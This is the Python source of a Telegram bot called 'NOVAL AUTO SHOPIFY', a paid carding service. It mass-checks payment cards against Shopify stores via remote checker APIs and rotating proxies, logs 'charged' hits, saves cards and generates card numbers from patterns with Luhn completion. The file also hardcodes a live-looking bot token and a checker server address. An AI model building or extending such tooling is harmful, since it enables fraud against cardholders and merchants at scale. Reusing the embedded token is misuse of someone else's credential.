# ─────────────────────────────────────────────────────────────────────────────
# NOVAL AUTO SHOPIFY — v51 (Final 45+ Features · All Fixed · Admin Control)
# ─────────────────────────────────────────────────────────────────────────────

import asyncio, gzip, html, io, json, logging, os, random, re, sqlite3, string, sys, threading, time, uuid, urllib.parse
from collections import defaultdict
from contextlib import contextmanager
from datetime import datetime, timezone, timedelta
from typing import Any, Dict, List, Optional

import aiohttp
from aiogram import Bot, Dispatcher, Router, F, BaseMiddleware
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart, CommandObject
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    InputMediaPhoto, InputMediaVideo, LabeledPrice, PreCheckoutQuery, BotCommand, BufferedInputFile,
)
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.exceptions import TelegramBadRequest

try:
    from aiohttp_socks import ProxyConnector
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False

# ── Env & Config ─────────────────────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "9012515117:AAHBOQixNNM75viCZdk7eTEnoq8EWEUqg9E") # APNA NAYA TOKEN YAHAN DAALEIN
DB_PATH = os.getenv("DB_PATH", "bot.db")
API_STATE_PATH = os.getenv("API_STATE_PATH", "api_endpoints.json")
SITES_PATH = os.getenv("SITES_PATH", "sites.txt")
PORT = os.getenv("PORT")

OWNER_ID = 6343891623
OWNER_ID2 = 8919487892
ADMIN_IDS = [OWNER_ID, OWNER_ID2]
LIMITED_ADMIN_IDS: List[int] = []
KEY_PREFIX = "NOVAL-PRO"
START_TIME = time.time()

CHECK_TIMEOUT            = 45
PROXY_CONNECT_TIMEOUT    = 10
PROXY_SOCK_READ_TIMEOUT  = 30

MASS_BATCH_SIZE_LB          = 250
MASS_BATCH_DELAY_LB         = 0.3
MASS_CONCURRENCY_LB_ADMIN   = 100
MASS_CONCURRENCY_LB_PREMIUM = 60

PROXY_TEST_TIMEOUT         = 15
PROXY_TEST_CONNECT_TIMEOUT = 10
PROXY_TEST_BATCH           = 25
PROXY_TEST_URL             = "https://api.ipify.org"
LIVE_PROXY_LIMIT           = 100
PER_PROXY_CONCURRENCY      = 4
PROXY_FAIL_THRESHOLD       = 2

DEFAULT_WORKERS_CAP = 900
ENDPOINT_FAIL_THRESHOLD = 3
ENDPOINT_COOLDOWN_SEC = 60

DUMMY_CC = "4111111111111111|12|30|123"
BOT_USERNAME = "NOVAL_AUTOSHOPI_BOT"
HIDDEN_CREDIT = "<blockquote><i>Powered by <a href='https://t.me/Senselessme'>@Senselessme</a></i></blockquote>"

RETRYABLE_CLS = {"timeout", "rate_limited", "site_error", "proxy_error", "error"}

# ── Media Assets ─────────────────────────────────────────────────────────────
VIDEOS = [
    "https://files.catbox.moe/7od2fh.mp4", "https://files.catbox.moe/ykw05n.mp4",
    "https://files.catbox.moe/6s7klz.mp4", "https://files.catbox.moe/1wt119.mp4",
    "https://files.catbox.moe/jzkofh.mp4", "https://files.catbox.moe/mxmzn7.mp4",
    "https://files.catbox.moe/5151uk.mp4"
]
IMAGES = [
    "https://files.catbox.moe/c2kzjk.jpg", "https://files.catbox.moe/lytev2.jpg",
    "https://files.catbox.moe/uky8rd.jpg", "https://files.catbox.moe/6lwbz8.jpg",
    "https://files.catbox.moe/g68i0b.jpg", "https://files.catbox.moe/cjkeeo.jpg",
    "https://files.catbox.moe/22bow8.jpg", "https://files.catbox.moe/w3sfcy.jpg",
    "https://files.catbox.moe/1zq5vj.jpg", "https://files.catbox.moe/oooo15.jpg",
    "https://files.catbox.moe/ezmqwe.jpg", "https://files.catbox.moe/ylw8v9.jpg",
    "https://files.catbox.moe/3xlvuu.jpg"
]
IMG_MAIN = IMAGES[0]

BACKUP_CHUNK_SIZE  = 18 * 1024 * 1024
BACKUP_SESSION_TTL = 3600
_restore_sessions = {}
_restore_lock = threading.RLock()

DEFAULT_API_STATE = {
    "version": 5,
    "endpoints": [
        {"url": "http://107.148.78.54:8083/shopify", "style": "raw", "cap": 900, "enabled": True, "key": None, "site_required": False},
    ],
    "active_idx": 0,
}
DEFAULT_SITES: List[str] = []
TELEGRAM_PROXY = None

PLANS = {
    "free": {"name": "Free Trial", "limit": 1000, "mass_limit": 100},
    "pro": {"name": "Pro", "limit": 5000, "mass_limit": 2000},
    "premium": {"name": "Premium", "limit": 10000, "mass_limit": 5000},
    "max": {"name": "Max", "limit": 30000, "mass_limit": 10000},
    "unlimited": {"name": "Unlimited", "limit": 999999, "mass_limit": 20000},
}
STAR_PRODUCTS = {
    "star_premium": {"plan": "premium", "stars": 200, "days": 30, "label": "Premium — 30 Days"},
    "star_max": {"plan": "max", "stars": 500, "days": 30, "label": "MAX — 30 Days"},
    "star_unlimited": {"plan": "unlimited", "stars": 800, "days": 30, "label": "Unlimited — 30 Days"},
}

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s", stream=sys.stderr)
log = logging.getLogger("noval")

EMOJI = {"settings":"5877260593903177342","back":"5875082500023258804","forward":"5832251986635920010","user":"5879770735999717115","pen":"5839380580080293813","docs":"5877301185639091664","trash":"5879915802815107172","unlock":"5886505193180239900","star":"5839116473951328489","chat":"5793933761594789855","help":"5897846616966041652","tools":"5988023995125993550","stop":"5870734657384877785","add":"5920090136627908485","shop":"5983399041197675256","gem":"5778546023349621090","gem2":"5963312935148195483","gem3":"6028530359975548369","chat2":"5985617073978481575","cross1":"5985346521103604145","up":"6030861234432121355","num1":"5794182096603847292","pen2":"5985774024968379294","loading":"6258124820400049944","infinity":"6258154670422757760","heart":"6257853292567597091","percent":"6258071055999438126","warn_red":"6257858798715670989","chart":"6258267877170745815","check":"6258098853027778582","online":"6260192112713666900","gem4":"6260181985180782013","up_tri":"6262482227930598980","diamond":"6260156752247918115","refresh":"6260297232038235681","check2":"6262671743362535108","diamond2":"6260308957298954089","green_sq":"6260565633134498058","down_tri":"6260486601441284439","ghost":"6282819035516113016","cross2":"6282852025159913806","check3":"6280338743442280499","hourglass":"6280443553529204094","glow_star":"6280674670014369924","smile":"6282811871510662984","upside":"6282622386143498738","warn":"6206077285720659346","warn2":"6206174450765796040","link":"6206497372176913599","book":"6206112371308500200","pill":"6206378324273403309","bell":"6206508629286196237","red_x":"6206110936789423908"}

def pbtn(text, *, icon="star", color="primary", callback_data=None, url=None):
    try: 
        return InlineKeyboardButton(
            text=text, 
            callback_data=callback_data, 
            url=url, 
            icon_custom_emoji_id=EMOJI.get(icon, EMOJI["star"]), 
            style=color
        )
    except Exception: 
        return InlineKeyboardButton(text=text, callback_data=callback_data, url=url)

def pe(name): return f'<tg-emoji emoji-id="{EMOJI.get(name, EMOJI["star"])}">👑</tg-emoji>'
def esc(text): return html.escape(str(text) if text is not None else "")

_SC_MAP = {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ','s':'ꜱ','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ'}
def sc(text: str) -> str: return "".join(_SC_MAP.get(ch.lower(), ch) for ch in str(text))

def owner_link(): return f'<a href="https://t.me/Senselessme">@Senselessme</a>'
def channel_link(): return f'<a href="https://t.me/NovalNetwork">@NovalNetwork</a>'

_URL_RE      = re.compile(r"https?://[^\s'\"<>]+", re.IGNORECASE)
_IP_PORT_RE  = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}(?::\d{1,5})?\b")
_HOST_PORT_RE = re.compile(r"\b[a-zA-Z0-9][a-zA-Z0-9\-\.]{1,}\.[a-zA-Z]{2,}(?::\d{1,5})?\b")
def _sanitize_err(msg) -> str:
    if not msg: return ""
    s = str(msg)
    s = _URL_RE.sub("[redacted]", s)
    s = _IP_PORT_RE.sub("[redacted]", s)
    s = _HOST_PORT_RE.sub("[redacted]", s)
    return s[:200]

def _user_link(uid: int, username: str = "") -> str:
    if not uid: return sc("GOKU")
    if username: return f'<a href="https://t.me/{esc(username.lstrip("@"))}">{esc(username)}</a>'
    return f'<a href="tg://user?id={uid}">User {uid}</a>'

def get_check_cooldown() -> int: return int(get_setting("cooldown_sec", "1"))

_state_lock = threading.RLock()
_sites_cache: List[str] = []
_sites_loaded = False

def _atomic_write(path: str, data: str) -> None:
    tmp = f"{path}.tmp"
    with open(tmp, "w", encoding="utf-8") as f: f.write(data)
    os.replace(tmp, path)

def _migrate_api_state(st: Dict[str, Any]) -> Dict[str, Any]:
    ver = int(st.get("version", 1) or 1)
    if ver < 5:
        existing = {e.get("url", "") for e in st.get("endpoints", [])}
        for ep in DEFAULT_API_STATE["endpoints"]:
            if ep["url"] not in existing: st.setdefault("endpoints", []).append(dict(ep))
        st["version"] = 5
    for ep in st.get("endpoints", []):
        ep.setdefault("style", "params"); ep.setdefault("cap", DEFAULT_WORKERS_CAP); ep.setdefault("enabled", True); ep.setdefault("key", None)
        if "site_required" not in ep: ep["site_required"] = (ep.get("style") == "params")
    st.setdefault("active_idx", 0)
    return st

def load_api_state() -> Dict[str, Any]:
    with _state_lock:
        try:
            with open(API_STATE_PATH, "r", encoding="utf-8") as f: st = json.load(f)
            if not isinstance(st.get("endpoints"), list): raise ValueError("bad state")
            return _migrate_api_state(st)
        except Exception:
            _atomic_write(API_STATE_PATH, json.dumps(DEFAULT_API_STATE, indent=2))
            return json.loads(json.dumps(DEFAULT_API_STATE))

def save_api_state(st: Dict[str, Any]) -> None:
    with _state_lock: _atomic_write(API_STATE_PATH, json.dumps(st, indent=2))

def _filtered_endpoints() -> List[Dict[str, Any]]:
    mode = get_setting("site_mode", "auto")
    st = load_api_state()
    eps = [e for e in st.get("endpoints", []) if e.get("enabled", True) and e.get("url")]
    if mode == "siteless": eps = [e for e in eps if not e.get("site_required", False)]
    elif mode == "with_site": eps = [e for e in eps if e.get("site_required", False)]
    return eps

def endpoints_need_sites() -> bool:
    eps = _filtered_endpoints()
    if not eps: return False
    return all(e.get("site_required", False) for e in eps)

def mode_label() -> str:
    m = get_setting("site_mode", "auto")
    if m == "siteless": return "SITELESS"
    if m == "with_site": return "WITH-SITE"
    return "AUTO"

_endpoint_rr = 0
_endpoint_rr_lock = threading.Lock()
_endpoint_fail_counts: Dict[str, int] = {}
_endpoint_fail_ts:    Dict[str, float] = {}

def mark_endpoint_fail(url: str):
    _endpoint_fail_counts[url] = _endpoint_fail_counts.get(url, 0) + 1
    if _endpoint_fail_counts[url] >= ENDPOINT_FAIL_THRESHOLD: _endpoint_fail_ts[url] = time.time()

def mark_endpoint_ok(url: str):
    _endpoint_fail_counts.pop(url, None)
    _endpoint_fail_ts.pop(url, None)

def is_endpoint_down(url: str) -> bool:
    ts = _endpoint_fail_ts.get(url, 0)
    if ts and time.time() - ts < ENDPOINT_COOLDOWN_SEC: return True
    if ts: _endpoint_fail_ts.pop(url, None); _endpoint_fail_counts.pop(url, None)
    return False

# ── Siteless / With-Site API pools ───────────────────────────────────────────
_sl_rr = 0; _ws_rr = 0
_sl_rr_lock = threading.Lock(); _ws_rr_lock = threading.Lock()

def get_siteless_apis() -> List[Dict[str, Any]]:
    try:
        with db() as c: return [{"endpoint": r["endpoint"], "key": r["key"] or ""} for r in c.execute("SELECT * FROM api_siteless WHERE enabled=1").fetchall()]
    except: return []

def get_withsite_apis() -> List[Dict[str, Any]]:
    try:
        with db() as c: return [{"endpoint": r["endpoint"], "key": r["key"] or ""} for r in c.execute("SELECT * FROM api_withsite WHERE enabled=1").fetchall()]
    except: return []

def add_siteless_api(endpoint: str, key: str = ""):
    with db() as c: c.execute("INSERT OR REPLACE INTO api_siteless(endpoint, key, enabled, added_at) VALUES(?,?,1,?)", (endpoint.strip(), key.strip(), datetime.now(timezone.utc).isoformat()))

def add_withsite_api(endpoint: str, key: str = ""):
    with db() as c: c.execute("INSERT OR REPLACE INTO api_withsite(endpoint, key, enabled, added_at) VALUES(?,?,1,?)", (endpoint.strip(), key.strip(), datetime.now(timezone.utc).isoformat()))

def remove_siteless_api(endpoint: str):
    with db() as c: c.execute("DELETE FROM api_siteless WHERE endpoint=?", (endpoint,))

def remove_withsite_api(endpoint: str):
    with db() as c: c.execute("DELETE FROM api_withsite WHERE endpoint=?", (endpoint,))

def pick_siteless_api() -> Optional[Dict[str, Any]]:
    global _sl_rr
    apis = get_siteless_apis()
    if not apis: return None
    with _sl_rr_lock: idx = _sl_rr % len(apis); _sl_rr += 1
    return apis[idx]

def pick_withsite_api() -> Optional[Dict[str, Any]]:
    global _ws_rr
    apis = get_withsite_apis()
    if not apis: return None
    with _ws_rr_lock: idx = _ws_rr % len(apis); _ws_rr += 1
    return apis[idx]

def build_siteless_url(api: Dict[str, Any], cc: str, proxy: Optional[str]) -> str:
    base = api["endpoint"].rstrip("/")
    cc_enc = urllib.parse.quote(cc, safe="")
    proxy_enc = urllib.parse.quote(proxy or "", safe=":@")
    sep = "&" if "?" in base else "?"
    url = f"{base}{sep}{cc_enc}"
    if proxy: url += f"&proxy={proxy_enc}"
    if api.get("key"): url += f"&key={urllib.parse.quote(api['key'], safe='')}"
    return url

def build_withsite_url(api: Dict[str, Any], cc: str, proxy: Optional[str], site: str) -> str:
    base = api["endpoint"].rstrip("/")
    cc_enc = urllib.parse.quote(cc, safe="")
    proxy_enc = urllib.parse.quote(proxy or "", safe=":@")
    site_full = site if site.startswith("http") else f"https://{site}"
    site_enc = urllib.parse.quote(site_full, safe=":/")
    sep = "&" if "?" in base else "?"
    url = f"{base}{sep}cc={cc_enc}&site={site_enc}&proxy={proxy_enc}"
    if api.get("key"): url += f"&key={urllib.parse.quote(api['key'], safe='')}"
    return url

async def _call_new_api(url: str, proxy: Optional[str], uid: Optional[int], timeout: float = 45.0) -> Dict[str, Any]:
    proxy_url = _proxy_to_url(proxy) if proxy else None
    is_socks = proxy_url and proxy_url.startswith(("socks5://", "socks5h://", "socks4://"))
    ct = aiohttp.ClientTimeout(total=timeout, connect=min(PROXY_CONNECT_TIMEOUT, timeout), sock_read=min(PROXY_SOCK_READ_TIMEOUT, timeout))
    try:
        if proxy:
            async with proxy_sem(proxy):
                if is_socks:
                    if not HAS_SOCKS: return {"cls": "error", "response": "socks not installed", "amount": 0.0, "currency": "USD", "gateway": "API", "check_time": "", "raw": ""}
                    connector = ProxyConnector.from_url(proxy_url)
                    async with aiohttp.ClientSession(connector=connector) as s:
                        async with s.get(url, timeout=ct) as r: text, status = await r.text(errors="ignore"), r.status
                else:
                    async with proxy_client_session().get(url, proxy=proxy_url, timeout=ct) as r: text, status = await r.text(errors="ignore"), r.status
            mark_proxy_ok(proxy)
        else:
            async with direct_session().get(url, timeout=ct) as r: text, status = await r.text(errors="ignore"), r.status
        res = parse_response(text, status); res["response"] = _sanitize_err(res.get("response", "")); return res
    except asyncio.TimeoutError:
        dropped = mark_proxy_fail(proxy) if proxy else False
        if dropped and uid is not None and proxy: remove_user_proxy(uid, proxy)
        return {"cls": "timeout", "response": "timeout", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "API", "check_time": "", "_dropped": dropped}
    except Exception as e:
        is_pe = _proxy_exc(e)
        dropped = False
        if proxy and is_pe: dropped = mark_proxy_fail(proxy); 
        if dropped and uid is not None and proxy: remove_user_proxy(uid, proxy)
        return {"cls": "proxy_error" if is_pe else "error", "response": _sanitize_err(str(e)), "raw": "", "amount": 0.0, "currency": "USD", "gateway": "API", "check_time": "", "_dropped": dropped}

def load_sites() -> List[str]:
    global _sites_cache, _sites_loaded
    with _state_lock:
        if _sites_loaded: return list(_sites_cache)
        try:
            with open(SITES_PATH, "r", encoding="utf-8") as f: _sites_cache = [l.strip() for l in f if l.strip()]
        except FileNotFoundError:
            _sites_cache = list(DEFAULT_SITES)
            _atomic_write(SITES_PATH, "")
        _sites_loaded = True
        return list(_sites_cache)

# DB
_db_conn: Optional[sqlite3.Connection] = None
_db_lock = threading.RLock()
_db_write_lock: Optional[asyncio.Lock] = None

def _get_write_lock() -> asyncio.Lock:
    global _db_write_lock
    if _db_write_lock is None: _db_write_lock = asyncio.Lock()
    return _db_write_lock

def _get_conn() -> sqlite3.Connection:
    global _db_conn
    if _db_conn is None:
        _db_conn = sqlite3.connect(DB_PATH, timeout=60, check_same_thread=False)
        _db_conn.row_factory = sqlite3.Row
        _db_conn.execute("PRAGMA journal_mode=WAL")
        _db_conn.execute("PRAGMA synchronous=NORMAL")
        _db_conn.execute("PRAGMA busy_timeout=60000")
    return _db_conn

def reset_db_conn():
    global _db_conn
    with _db_lock:
        if _db_conn:
            try: _db_conn.close()
            except: pass
            _db_conn = None
    return _get_conn()

@contextmanager
def db():
    conn = _get_conn()
    with _db_lock:
        try:
            yield conn
            conn.commit()
        except Exception:
            conn.rollback()
            raise

def init_db() -> None:
    with db() as c:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            uid INTEGER PRIMARY KEY, username TEXT DEFAULT '', plan TEXT DEFAULT 'free',
            premium_until TEXT DEFAULT '', daily_checks INTEGER DEFAULT 0,
            last_check_date TEXT DEFAULT '', credits INTEGER DEFAULT 50,
            last_credit_date TEXT DEFAULT '', trial_last_used TEXT DEFAULT '',
            awaiting TEXT DEFAULT '', banned INTEGER DEFAULT 0, ban_reason TEXT DEFAULT '',
            refer_count INTEGER DEFAULT 0, referred_by INTEGER DEFAULT 0, streak INTEGER DEFAULT 0,
            last_streak_date TEXT DEFAULT '', total_checks INTEGER DEFAULT 0,
            total_hits INTEGER DEFAULT 0, last_seen TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
        CREATE TABLE IF NOT EXISTS redeem_codes (code TEXT PRIMARY KEY, plan TEXT, max_uses INTEGER, used INTEGER DEFAULT 0, days INTEGER DEFAULT 30);
        CREATE TABLE IF NOT EXISTS redeem_log (id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, uid INTEGER, used_at TEXT, UNIQUE(code, uid));
        CREATE TABLE IF NOT EXISTS check_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, uid INTEGER, cc TEXT, response TEXT, status TEXT, gateway TEXT, ts TEXT);
        CREATE TABLE IF NOT EXISTS saved_cards (id INTEGER PRIMARY KEY AUTOINCREMENT, uid INTEGER, cc TEXT, saved_at TEXT, UNIQUE(uid, cc));
        CREATE TABLE IF NOT EXISTS bin_cache (bin TEXT PRIMARY KEY, data TEXT, ts TEXT);
        CREATE TABLE IF NOT EXISTS user_proxies (
            id INTEGER PRIMARY KEY AUTOINCREMENT, uid INTEGER, proxy TEXT,
            status TEXT DEFAULT 'unknown', latency REAL DEFAULT 0,
            checked_at TEXT DEFAULT '', UNIQUE(uid, proxy)
        );
        CREATE TABLE IF NOT EXISTS sites (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT UNIQUE);
        CREATE TABLE IF NOT EXISTS force_channels (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id TEXT UNIQUE, title TEXT DEFAULT '', chat_type TEXT DEFAULT 'channel',
            invite_link TEXT DEFAULT '', enabled INTEGER DEFAULT 1, added_at TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS charged_hits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cc TEXT, site TEXT, response TEXT,
            amount REAL DEFAULT 0, currency TEXT DEFAULT 'USD',
            uid INTEGER DEFAULT 0, ts TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS feedback (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uid INTEGER, username TEXT, msg_type TEXT, text TEXT, file_id TEXT, file_type TEXT DEFAULT 'none', ts TEXT
        );
        CREATE TABLE IF NOT EXISTS api_siteless (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            endpoint TEXT UNIQUE, key TEXT DEFAULT '', enabled INTEGER DEFAULT 1, added_at TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS api_withsite (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            endpoint TEXT UNIQUE, key TEXT DEFAULT '', enabled INTEGER DEFAULT 1, added_at TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS scrapper_gcs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id TEXT UNIQUE, title TEXT DEFAULT '', added_at TEXT DEFAULT ''
        );
        """)
        for k, v in [
            ("maintenance", "0"), ("hit_log_channel", ""), ("auto_post_chat", ""), ("charged_gc_id", ""),
            ("charged_gc_name", ""), ("public_gc_id", ""), ("fb_channel_id", ""), ("fb_channel_id2", ""),
            ("site_max_price", "6.0"), ("site_health", "{}"), ("extra_admins", ""), ("limited_admins", ""),
            ("pvt_file_gc_id", ""), ("pvt_file_gc_name", ""), ("pvt_cc_gc_id", ""), ("pvt_cc_gc_name", ""),
            ("site_mode", "auto"), ("daily_credits", "50"), ("gen_limit", "10"),
            ("bot_name", "NOVAL AUTO SHOPIFY"), ("support_link", "https://t.me/Senselessme"),
            ("wallet_usdt", "Enter USDT Address"), ("wallet_ton", "Enter TON Address"),
            ("asset_IMG_MAIN", IMG_MAIN), ("asset_VID_MAIN", ""),
            ("cooldown_sec", "1"), ("price_weekly", "10"), ("price_monthly", "30"), ("trial_hours", "3"),
            ("proxy_required", "0"), ("anti_spam_limit", "5"), ("support_enabled", "1"), ("max_retries", "3"),
            ("scrapper_enabled", "1"),
        ]: c.execute("INSERT OR IGNORE INTO settings(key, value) VALUES (?,?)", (k, v))

def get_setting(key, default=""):
    try:
        with db() as c:
            r = c.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
            return r["value"] if r else default
    except: return default

def set_setting(key, value):
    with db() as c: c.execute("INSERT INTO settings(key,value) VALUES (?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value", (key, str(value)))

def load_extra_admins():
    try:
        stored = get_setting("extra_admins", "")
        if stored:
            for x in stored.split(","):
                if x.strip().isdigit() and int(x) not in ADMIN_IDS: ADMIN_IDS.append(int(x))
        lst = get_setting("limited_admins", "")
        if lst:
            for x in lst.split(","):
                if x.strip().isdigit() and int(x) not in LIMITED_ADMIN_IDS: LIMITED_ADMIN_IDS.append(int(x))
    except: pass

def save_extra_admins():
    try:
        set_setting("extra_admins", ",".join(str(x) for x in ADMIN_IDS if x not in (OWNER_ID, OWNER_ID2)))
        set_setting("limited_admins", ",".join(str(x) for x in LIMITED_ADMIN_IDS))
    except: pass

def get_user(uid):
    try:
        with db() as c: return c.execute("SELECT * FROM users WHERE uid=?", (uid,)).fetchone()
    except: return None

def ensure_user(uid, username=""):
    try:
        with db() as c:
            row = c.execute("SELECT uid FROM users WHERE uid=?", (uid,)).fetchone()
            today, now = datetime.now(timezone.utc).date().isoformat(), datetime.now(timezone.utc).isoformat()
            if not row: c.execute("INSERT OR IGNORE INTO users(uid, username, last_credit_date, last_check_date, last_seen) VALUES (?,?,?,?,?)", (uid, username or "", today, today, now))
            else: c.execute("UPDATE users SET username=?, last_seen=? WHERE uid=?", (username or "", now, uid))
    except Exception as e: log.warning(f"ensure_user: {e}")

def get_user_or_create(uid, username=""):
    ensure_user(uid, username)
    return get_user(uid)

def set_awaiting(uid, state):
    ensure_user(uid)
    with db() as c: c.execute("UPDATE users SET awaiting=? WHERE uid=?", (state, uid))

def get_awaiting(uid):
    u = get_user(uid)
    return u["awaiting"] if u else ""

def is_full_admin(uid): return uid in ADMIN_IDS
def is_limited_admin(uid): return uid in LIMITED_ADMIN_IDS
def is_admin(uid): return is_full_admin(uid) or is_limited_admin(uid)

def plan_of(uid):
    u = get_user(uid)
    return u["plan"] if u and u["plan"] in PLANS else "free"

def upgrade_user(uid, plan_name, days=30):
    if plan_name not in PLANS: return
    ensure_user(uid)
    exp = "" if plan_name == "unlimited" else (datetime.now(timezone.utc) + timedelta(days=days)).isoformat()
    with db() as c: c.execute("UPDATE users SET plan=?, premium_until=? WHERE uid=?", (plan_name, exp, uid))

class EnsureUserMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        try:
            u = data.get("event_from_user")
            if u and not getattr(u, "is_bot", False): ensure_user(u.id, u.username or "")
        except: pass
        return await handler(event, data)

_sites_cache2 = None
_sites_cache_ts = 0

def _invalidate_sites():
    global _sites_cache, _sites_cache2, _sites_cache_ts, _sites_loaded
    _sites_cache, _sites_cache2, _sites_cache_ts, _sites_loaded = [], None, 0, False

def get_sites() -> List[str]:
    global _sites_cache2, _sites_cache_ts
    now = time.time()
    if _sites_cache2 is not None and (now - _sites_cache_ts) < 30: return _sites_cache2
    try:
        with db() as c: _sites_cache2 = [r["url"] for r in c.execute("SELECT url FROM sites ORDER BY id").fetchall()]
    except: _sites_cache2 = []
    _sites_cache_ts = now
    return _sites_cache2

def add_site_db(url: str) -> bool:
    url = url.strip().lower()
    if url.startswith("https://"): url = url[8:]
    elif url.startswith("http://"): url = url[7:]
    url = url.split("/")[0]
    if not url: return False
    with db() as c: c.execute("INSERT OR IGNORE INTO sites(url) VALUES (?)", (url,))
    _invalidate_sites()
    return True

def remove_site_db(url: str):
    with db() as c: c.execute("DELETE FROM sites WHERE url=?", (url,))
    _invalidate_sites()

def force_channels_list(enabled_only=False):
    with db() as c:
        q = "SELECT * FROM force_channels"
        if enabled_only: q += " WHERE enabled=1"
        return c.execute(q).fetchall()

def add_force_channel(chat_id: str, title: str = "", chat_type: str = "channel", invite_link: str = ""):
    with db() as c: c.execute("INSERT OR REPLACE INTO force_channels(chat_id, title, chat_type, invite_link, enabled, added_at) VALUES (?, ?, ?, ?, 1, ?)", (str(chat_id), title, chat_type, invite_link, datetime.now(timezone.utc).isoformat()))

def remove_force_channel(chat_id: str):
    with db() as c: c.execute("DELETE FROM force_channels WHERE chat_id=?", (str(chat_id),))

def toggle_force_channel(chat_id: str):
    with db() as c:
        row = c.execute("SELECT enabled FROM force_channels WHERE chat_id=?", (str(chat_id),)).fetchone()
        if row:
            new = 0 if row["enabled"] else 1
            c.execute("UPDATE force_channels SET enabled=? WHERE chat_id=?", (new, str(chat_id)))
            return new
    return 0

async def check_force_sub(bot, uid):
    if is_admin(uid): return True
    if get_setting("force_sub_enabled", "1") != "1": return True
    for ch in force_channels_list(enabled_only=True):
        try:
            m = await bot.get_chat_member(ch["chat_id"], uid)
            if m.status in ("left", "kicked"): return False
        except: pass
    return True

_site_fail_count: Dict[str, int] = {}
_site_cooldown_until: Dict[str, float] = {}
SITE_MIN_GAP = 1.0
_site_last_hit: Dict[str, float] = {}
_site_locks: Dict[str, asyncio.Lock] = {}

async def acquire_site_slot(site: str):
    if not site: return
    lock = _site_locks.setdefault(site, asyncio.Lock())
    async with lock:
        wait = SITE_MIN_GAP - (time.time() - _site_last_hit.get(site, 0))
        if wait > 0: await asyncio.sleep(wait)
        _site_last_hit[site] = time.time()

def _is_site_benched(site): return time.time() < _site_cooldown_until.get(site, 0)
def _bench_site(site, seconds=120): _site_cooldown_until[site] = time.time() + seconds

def _pick_random_sites(n=3):
    sites = get_sites()
    if not sites: return []
    healthy = [s for s in sites if not _is_site_benched(s)]
    pool = healthy if healthy else list(sites)
    random.shuffle(pool)
    return pool[:n]

_mass_tasks = {}
_pending_mass: Dict[str, Dict[str, Any]] = {}

def _cleanup_pending_mass():
    now = time.time()
    for k in [k for k, v in _pending_mass.items() if now - v.get("ts", 0) > 3600]: _pending_mass.pop(k, None)

CC_REGEX = re.compile(r"^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$")

def normalize_cc(raw):
    if not raw: return None
    s = re.sub(r"[\s:;,/\-]+", "|", raw.strip())
    parts = [p for p in s.split("|") if p]
    if len(parts) != 4: return None
    num, mm, yy, cvv = (re.sub(r"\D", "", x) for x in parts)
    if not (num and mm and yy and cvv) or not (13 <= len(num) <= 19): return None
    if len(yy) == 4: yy = yy[2:]
    cc = f"{num}|{mm.zfill(2)[:2]}|{yy.zfill(2)[:2]}|{cvv.zfill(3)[:4]}"
    return cc if CC_REGEX.match(cc) else None

def country_flag(code):
    if not code or len(code) != 2 or not code.isalpha(): return "🌍"
    return chr(0x1F1E6 + ord(code[0].upper()) - 65) + chr(0x1F1E6 + ord(code[1].upper()) - 65)

def luhn_check_digit(partial):
    for d in "0123456789":
        if luhn_ok(partial + d): return d
    return "0"

def luhn_ok(card):
    if not card.isdigit(): return False
    total, rev = 0, card[::-1]
    for i, ch in enumerate(rev):
        d = ord(ch) - 48
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        total += d
    return total % 10 == 0

def brand_pe(cc):
    if cc.startswith('4'): return f"{pe('gem')} ᴠɪꜱᴀ"
    if cc.startswith('5'): return f"{pe('gem2')} ᴍᴀꜱᴛᴇʀ"
    if cc.startswith(('34','37')): return f"{pe('gem3')} ᴀᴍᴇx"
    return f"{pe('gem4')} ᴅɪꜱᴄ"

def generate_custom_cc(pattern: str, count: int = 10) -> List[str]:
    cards = []
    for _ in range(count):
        cc = pattern
        cc = re.sub(r'[xX]', lambda _: random.choice(string.digits), cc)
        parts = cc.split('|')
        if len(parts) != 4: continue
        num, mm, yy, cvv = parts
        if len(num) < 13 or len(num) > 19: continue
        if len(mm) < 1 or len(mm) > 2: continue
        if len(yy) < 2 or len(yy) > 4: continue
        if len(cvv) < 3 or len(cvv) > 4: continue
        mm = mm.zfill(2)
        if len(yy) == 2: yy = yy.zfill(2)
        elif len(yy) == 4: yy = yy[2:]
        if len(num) == 15: num += luhn_check_digit(num)
        final_card = f"{num}|{mm}|{yy}|{cvv}"
        if CC_REGEX.match(final_card): cards.append(final_card)
    return cards

